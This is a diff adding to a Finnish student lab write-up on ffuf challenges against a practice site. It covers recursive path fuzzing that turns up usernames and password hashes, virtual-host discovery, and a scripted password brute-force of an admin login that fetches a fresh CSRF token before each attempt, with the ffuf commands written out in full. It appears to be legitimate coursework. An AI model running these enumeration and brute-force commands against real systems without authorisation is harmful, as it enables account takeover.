@@ -156,11 +156,122 @@ Vihje: "**Directories redirect to their trailing-slash form, which is the signal
 Käytettävät flagit: ```-recursion, -recursion-depth```
 
 - ```-recursion``` = Scan discovered directories recursively. Ffuf ajaa sanalistoja sisäkkäin poluissa, eli kokeilee niitä polusta polkuun.
+
 - ```-recursion-depth``` = Maximum recursion depth (0 = unlimited). Määrittää, kuinka "syvälle" ffuf yrittää maksimissaan.
 
 
+Ajoin komennon: ```ffuf -w content.txt -u 'https://ffuf.io.fi/FUZZ' -ac -recursion -recursion-depth 0 -v -rate 400```
+
+- ```-v``` = Verbose output. Yksinkertaistaa tulostusta, en ole varma onko parempaa tapaa saada ffuf tulostetta yksinkertaisemmaksi.
+
+<img width="822" height="372" alt="image" src="https://github.com/user-attachments/assets/96e6518e-4833-4b1e-8243-e40d57d0be7c" />
+
+- Tuloksia oli taas paljon, joten summaan mielestäni oleelliset alle.
+
+Tuloksia:
+
+<img width="1168" height="178" alt="image" src="https://github.com/user-attachments/assets/e63d1fa4-e9c5-435a-9838-f24a50bbf42a" />
+
+- Tämä on ainakin hyvä löydös hyökkääjälle, käyttäjätunnuksia ja hashattyjä salasanoja.
+
+<img width="510" height="87" alt="image" src="https://github.com/user-attachments/assets/370561f5-cbf4-4e5b-82b3-76ad594d1c05" />
+
+- Kvartaalittain olevat vuoden 2026 raportit.
+
+## c4) Virtual hosts
+
+Ffuf.io.fi alla on 3 hostnamea, jotka antavat erilaista sisältöä samalla nimellä. Tehtävässä täytyy löytää ne kolme.
+
+Vihje: "**The keyword does not have to go in the URL. Point -u at the bare domain and put FUZZ in a Host header. Do not point -u at the subdomain: the certificate only covers the bare name, so the handshake is refused and you get no HTTP at all. Everything that is not one of the three falls through to the default site, so you need a filter.**"
+
+Tehtävänannossa on myös käytettävät parametrit:
+
+- ```-H "Host: FUZZ.ffuf.io.fi"``` = Header value. Tähän asetetaan header.
+
+Käytin tässä komentoa: ```ffuf -u https://ffuf.io.fi/ -w content.txt -H "Host: FUZZ.ffuf.io.fi"  -rate 400```
+
+<img width="771" height="551" alt="image" src="https://github.com/user-attachments/assets/8f7e6c8b-843c-4c30-b74f-5ca88bdcb0df" />
+
+- Tulosteena taas false-positivea, poissuljen sen käyttämällä filtteröintiä sanamäärään 377.
+
+```-fw``` = Filter words. Tällä voin filtteröidä sanamäärän mukaan osumia pois.
+
+Uusi komento: ```ffuf -u https://ffuf.io.fi/ -w content.txt -H "Host: FUZZ.ffuf.io.fi" -fw 377  -rate 400```
+
+<img width="819" height="496" alt="image" src="https://github.com/user-attachments/assets/51640407-d552-4a37-af89-028a6fed84ae" />
+
+- Löysin vain yhden, voisiko jollain toisella sanakirjalla löytyä jotain?
+
+Kokeilin eri sanakirjalla, joka löytyy Kalin wordlisteistä polusta: ```/usr/share/wordlists/dirb/big.txt```
+
+Komento: ```ffuf -u https://ffuf.io.fi/ -w /usr/share/wordlists/dirb/big.txt -H "Host: FUZZ.ffuf.io.fi" -fw 3```
+
+<img width="832" height="511" alt="image" src="https://github.com/user-attachments/assets/83889701-7dc5-4b25-ae01-aefac8a7a114" />
+
+- Löysin tällä sanakirjalla enemmän tuloksia, toivottavasti oikeita.
+- admin, dev, staging.
+
+## c9) The login you cannot replay (Has preflight! Has CSRF token!)
+
+Tämä vaikutti mielenkiintoisimmalta, sekä haastavimmalta näistä.
+
+Tehtävänä oli päästä admin käyttäjälle sisälle, verkkoselain palauttaa aina 403, riippumatta ajokerroista.
+
+Vihje: "**Every form carries a CSRF token that works exactly once. Fetch a fresh one before each attempt instead of replaying a stale one.**"
+
+Käytin tässä tehtäväsivulla olevia ohjeita, sillä tämä on todella edistynyttä ainakin omasta mielestä!
+
+Loin ```login.raw```-tiedoston komennolla: ```
+
+<img width="721" height="217" alt="image" src="https://github.com/user-attachments/assets/9253f053-6a0c-4bc8-9b62-96e308547cc8" />
+
+- Login.raw hakee aina uuden tokenin yritysten jälkeen.
+
+Seuraavaksi syötin ohjeiden mukaisesti terminaaliin komennon: 
+
+```
+
+ffuf -w passwords.txt -u https://ffuf.io.fi/login -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "csrf_token=CSRFTOKEN&username=admin&password=FUZZ" \
+  -preflight login.raw \
+  -preflight-var 'CSRFTOKEN:name="csrf_token" value="([a-f0-9]+)"' \
+  -preflight-mode per-request \
+  -mc 302
+
+```
+
+- ```-preflight login.raw``` = Pyytää aina uuden CRTF-tokenin yrityksen jälkeen.
+- ```-preflight-var 'CSRFTOKEN:name="csrf_token" value="([a-f0-9]+)"'``` = Poimii uuden CRTF-tokenin, minkä ```-preflight``` pyytää.
+- ```-preflight-mode per-request``` = Ajaa koko komennon uudestaan joka yrityksellä, eli ```-preflight login.raw``` --> ```preflight-var xxxxxxx``` --> **YRITYS** ja sama uudestaan.
+
+-  Nämä parametrien selitykset löytyivät sivulta: "[Preflight and postflight](https://github.com/ffuf/ffuf/wiki/Preflight-and-postflight)".
+
+<img width="736" height="526" alt="image" src="https://github.com/user-attachments/assets/5951e52f-24d1-4360-a8aa-d416e35a8d93" />
+
+- Cracked!
+
+- Tämä on ainakin selvä onnistuminen.
 
 
+## Lähteet 
 
+ffuf. 2026. ffuf uusin versio. Luettavissa: https://github.com/ffuf/ffuf/releases/tag/v2.3.0
 
+ffuf. 2026. ffuf wiki. Luettavissa: https://github.com/ffuf/ffuf/wiki
 
+ffuf. 2026. ffuf wiki, komentorivi manuaali. Luettavissa: https://github.com/ffuf/ffuf/wiki/CLI-flags
+
+ffuf. 2026. ffuf wiki. Preflight and postflight. Luettavissa: https://github.com/ffuf/ffuf/wiki/Preflight-and-postflight
+
+ffuf. 2026. GitHub-repositorio. Luettavissa: https://github.com/ffuf/ffuf
+
+Hoikkala, J. 2026. Luentokalvot kurssin tunnilta 24.9.2026. Luettavissa: https://io.fi/fuzzing_with_ffuf.pdf
+
+Karvinen, T. 2026. Tunkeutumistestaus kurssisivu. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/
+
+Vaultline. s.a. Tehtävän sanalista. Saatavilla: https://ffuf.io.fi/wordlists/content.txt
+
+Vaultline. s.a Tehtävän salasanalista. Saatavilla: https://ffuf.io.fi/wordlists/passwords.txt
+
+Vaultline Oy. s.a. How to play, ffuf haasteet. luettavissa: https://ffuf.io.fi/play
